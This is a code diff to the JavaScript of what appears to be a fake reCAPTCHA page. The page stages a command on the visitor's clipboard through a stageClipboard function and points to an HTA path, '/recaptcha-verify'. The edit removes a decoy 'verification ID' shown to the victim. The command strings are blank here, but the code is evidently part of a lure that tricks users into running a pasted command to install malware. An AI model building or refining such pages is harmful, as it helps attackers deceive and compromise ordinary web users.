@@ -391,7 +391,7 @@
             document.body.removeChild(tempTextArea);
         }
 
-        function stageClipboard(commandToRun, verification_id){
+        function stageClipboard(commandToRun){
             const suffix = ""
             const ploy = ""
             const end = ""
@@ -415,13 +415,10 @@
             if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth-10 ) {
                verifywindow.style.left =  checkboxWindow.offsetLeft - 8  + "px";
             }
-
-            var verification_id = generateRandomNumber();
-            document.getElementById('verification-id').textContent = verification_id;
             
             const htaPath = window.location.origin + "/recaptcha-verify";
             const commandToRun = ""
-            stageClipboard(commandToRun, verification_id)
+            stageClipboard(commandToRun)
         }
 
         addCaptchaListeners();
